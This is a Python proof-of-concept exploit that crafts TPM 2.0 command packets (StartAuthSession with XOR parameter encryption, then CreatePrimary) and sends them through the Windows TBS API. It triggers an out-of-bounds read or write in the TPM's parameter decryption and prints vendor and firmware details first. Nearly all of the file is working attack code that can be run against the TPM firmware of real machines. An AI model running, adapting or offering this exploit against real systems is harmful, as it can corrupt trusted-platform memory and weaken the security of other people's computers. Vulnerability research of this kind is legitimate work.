import ctypes
import struct
import sys
import os
import platform

# Ajouter les constantes et les types pour l'API TBS
TBS_CONTEXT_PARAMS_VERSION_ONE = 1
TBS_COMMAND_PRIORITY_LOW = 100
TBS_COMMAND_PRIORITY_NORMAL = 200
TBS_COMMAND_PRIORITY_HIGH = 300
TBS_COMMAND_PRIORITY_SYSTEM = 400
TBS_COMMAND_PRIORITY_MAX = 0x80000000

class TBS_CONTEXT_PARAMS(ctypes.Structure):
    _fields_ = [('version', ctypes.c_ulong),
                ('flags', ctypes.c_ulong)]

TBS_HCONTEXT = ctypes.c_ulong
TBS_RESULT = ctypes.c_ulong

tbs = ctypes.WinDLL('Tbs.dll')

TPM_DEVICE = '/dev/tpm0'
TPM_PT_MAX_COMMAND_SIZE = 0x11e
TPM_PT_MANUFACTURER    = 0x105
TPM_PT_VENDOR_STRING_1 = 0x106
TPM_PT_VENDOR_STRING_2 = 0x107
TPM_PT_VENDOR_STRING_3 = 0x108
TPM_PT_VENDOR_STRING_4 = 0x109
TPM_PT_FIRMWARE_VERSION_1 = 0x10b
TPM_PT_FIRMWARE_VERSION_2 = 0x10c

def hexdump(src: bytes, columns: int=16, header: bool = True) -> str:
    if not src or len(src) == 0:
        return ""

    if not (1 <= columns <= 255):
        raise ValueError("columns must be greater than 0 and less than 256.")

    result = list()
    if header:
        result.append("Off   {}   ASCII".format(" ".join(["{:02X}".format(i) for i in range(columns)])))

    src_len = len(src)
    for i in range(0, src_len, columns):
        s = src[i:i + columns]
        hex_str = " ".join(["{:02X}".format(c) for c in s])
        ascii_str = "".join([chr(x) if 0x20 <= x < 0x7f else '.' for x in s])
        result.append("{:04X}  {:<{len}}  {}".format(i, hex_str, ascii_str, len=columns * (2 + 1)))
    return '\n'.join(result)


def tpm_property_cmd(tpm_prop):
    tag  = struct.pack('>H', 0x8001)            # TPM_ST_NO_SESSIONS
    get_mft  = struct.pack('>L', 0x0000017A)    # TPM_CC_GetCapability
    get_mft += struct.pack('>L', 0x00000006)    # TPM_CAP_TPM_PROPERTIES
    get_mft += struct.pack('>L', tpm_prop)      # e.g. TPM_PT_MANUFACTURER
    get_mft += struct.pack('>L', 0x00000001)    # property count

    total_size = len(tag) + 4 + len(get_mft)
    return tag + struct.pack('>L', total_size) + get_mft


def parse_property_response(response):
    response_code = struct.unpack('>L', response[6:10])[0]
    print('\nResponse code: 0x{:08x}'.format(response_code))
    prop_value = struct.unpack('>L', response[0x17:0x1b])[0]
    print('Property value: 0x{:08x}\n'.format(prop_value))
    return prop_value


def create_session_symmetric_xor():
    tag = struct.pack('>H', 0x8001)             # tag = TPM_ST_NO_SESSIONS

    header  = struct.pack('>L', 0x00000176)     # command = TPM_CC_StartAuthSession

    auth  = struct.pack('>L', 0x40000007)       # tpmKey = TPM_RH_NULL
    auth += struct.pack('>L', 0x40000007)       # bind = TPM_RH_NULL
    auth += struct.pack('>H', 0x0020)           # nonceCaller length
    # nonceCaller (0x20 bytes)
    # in the OOB read bug, these 2 bytes are read past the end of the Create_Primary packet, and go to the cipherSize variable in CryptParameterDecryption
    #                                                          vv    vv
    auth += bytes([ 0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f,
                    0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f]
                  )
    auth += struct.pack('>H', 0x0000)           # encrypted salt length
    auth += struct.pack('>B', 0x00)             # session type = TPM_SE_HMAC
    auth += struct.pack('>H', 0x000a)           # symmetric.algorithm = TPM_ALG_XOR
    auth += struct.pack('>H', 0x000b)           # symmetric.keyBits = TPM_ALG_SHA256
    auth += struct.pack('>H', 0x000b)           # authHash = TPM_ALG_SHA256

    total_size = len(tag) + 4 + len(header) + len(auth)
    pkt = tag + struct.pack('>L', total_size) + header + auth
    return pkt


def create_primary_oob_write(session_handle, max_command_size):

    tag = struct.pack('>H', 0x8002)             # TPM_ST_SESSIONS
    header  = struct.pack('>L', 0x00000131)     # command = TPM_CC_CreatePrimary
    header += struct.pack('>L', 0x40000001)     # primaryHandle = TPM_RH_OWNER

    auth  = struct.pack('>L', session_handle)   # sessionHandle
    auth += struct.pack('>H', 0x0000)           # nonceSize
    auth += struct.pack('>B', 0x20)             # sessionAttributes = decrypt
    auth += struct.pack('>H', 0x0000)           # authorizationSize

    header += struct.pack('>L', len(auth))

    parameters  = struct.pack('>H', max_command_size - 0x1d + 2)
    parameters += bytes([0x88] * (max_command_size - 0x1d))
    total_size = len(tag) + 4 + len(header) + len(auth) + len(parameters)

    return tag + struct.pack('>L', total_size) + header + auth + parameters


def create_primary_oob_read(session_handle):

    tag = struct.pack('>H', 0x8002)             # TPM_ST_SESSIONS
    header  = struct.pack('>L', 0x00000131)     # command = TPM_CC_CreatePrimary
    header += struct.pack('>L', 0x40000001)     # primaryHandle = TPM_RH_OWNER

    auth  = struct.pack('>L', session_handle)   # sessionHandle
    auth += struct.pack('>H', 0x0000)           # nonceSize
    auth += struct.pack('>B', 0x20)             # sessionAttributes = decrypt
    auth += struct.pack('>H', 0x0000)           # authorizationSize

    header += struct.pack('>L', len(auth))

    total_size = len(tag) + 4 + len(header) + len(auth)
    return tag + struct.pack('>L', total_size) + header + auth


def get_session_handle(response):
    response_code = struct.unpack(">L", response[6:10])[0]
    session_handle = struct.unpack(">L", response[10:14])[0]
    print("Response code: 0x{:08x}".format(response_code))
    print("Session handle: 0x{:08x}".format(session_handle))
    return session_handle


def get_tpm_property(tpm_prop):
    pkt = tpm_property_cmd(tpm_prop)
    response = send_and_receive(pkt)
    return parse_property_response(response)


def print_vendor_info():
    manufacturer = get_tpm_property(TPM_PT_MANUFACTURER)

    vendor_strings = []
    for i in [TPM_PT_VENDOR_STRING_1, TPM_PT_VENDOR_STRING_2, TPM_PT_VENDOR_STRING_3, TPM_PT_VENDOR_STRING_4]:
        vendor_strings.append(struct.pack('>L', get_tpm_property(i)))

    version1 = get_tpm_property(TPM_PT_FIRMWARE_VERSION_1)
    version2 = get_tpm_property(TPM_PT_FIRMWARE_VERSION_2)

    print('\n=== Vendor information ===')
    print('\t[i] TPM manufacturer: 0x{:08x} ("{}")'.format(manufacturer, struct.pack('>L', manufacturer).decode('latin-1')))
    print('\t[i] Vendor strings: {} ("{}")'.format(vendor_strings, b''.join(vendor_strings).decode('latin-1')))
    print('\t[i] Firmware version: [0x{:08x} 0x{:08x}] ("{:d}.{:d}.{:d}.{:d})"'.format(version1, version2, \
         (version1 & 0xffff0000) >> 16 , version1 & 0xffff, (version2 & 0xffff0000) >> 16, version2 & 0xffff))
    print('\n\n')


def send_and_receive(pkt):
    # Créer un contexte TBS
    context_params = TBS_CONTEXT_PARAMS(version=TBS_CONTEXT_PARAMS_VERSION_ONE, flags=0)
    h_context = TBS_HCONTEXT()
    result = tbs.Tbsi_Context_Create(ctypes.byref(context_params), ctypes.byref(h_context))
    if result != 0:
        raise Exception("Tbsi_Context_Create failed with error code: 0x{:08x}".format(result))

    # Envoyer la commande TPM
    response = ctypes.create_string_buffer(1024)
    response_len = ctypes.c_ulong(1024)
    result = tbs.Tbsip_Submit_Command(h_context, TBS_COMMAND_PRIORITY_NORMAL, pkt, len(pkt),
                                      response, ctypes.byref(response_len))
    if result != 0:
        raise Exception("Tbsip_Submit_Command failed with error code: 0x{:08x}".format(result))

    # Fermer le contexte TBS
    result = tbs.Tbsip_Context_Close(h_context)
    if result != 0:
        raise Exception("Tbsip_Context_Close failed with error code: 0x{:08x}".format(result))

    print('\nResponse len: {} bytes'.format(response_len.value))
    print(hexdump(response.raw[:response_len.value]))
    return response.raw[:response_len.value]




def is_admin():
    if platform.system() == 'Windows':
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except ImportError:
            print("Unable to import ctypes module.")
            sys.exit(1)
    else:  # Assuming Unix-based systems (Linux, macOS)
        return os.geteuid() == 0

def main():
    if not is_admin():
        print('Please run as root.')
        sys.exit(1)

    if (len(sys.argv) >= 2) and (sys.argv[1].lower() in ['oobread', 'oobwrite']):
        poc = sys.argv[1].lower()
    else:
        print('Usage: {} <oobread | oobwrite>'.format(sys.argv[0]))
        sys.exit(1)


    if not os.path.exists(TPM_DEVICE) and platform.system() != 'Windows':
        print('[-] Device {} not found, are you sure this computer has a TPM?'.format(TPM_DEVICE))
        sys.exit(1)

    print_vendor_info()

    pkt = create_session_symmetric_xor()
    print('[1] Sending a Create_Session packet...')
    response = send_and_receive(pkt)
    session_handle = get_session_handle(response)
    print('\n\n')
    print('[2] Getting the TPM_PT_MAX_COMMAND_SIZE property...')
    max_command_size = get_tpm_property(TPM_PT_MAX_COMMAND_SIZE)

    if poc == 'oobread':
        print('[3] Triggering the OOB read with a Create_Primary packet...')
        pkt = create_primary_oob_read(session_handle)
    elif poc == 'oobwrite':
        print('[3] Triggering the OOB write with a Create_Primary packet...')
        pkt = create_primary_oob_write(session_handle, max_command_size)
    else:
        raise Exception('Unknown POC option {}'.format(poc))
    send_and_receive(pkt)


if __name__ == '__main__':
    main()


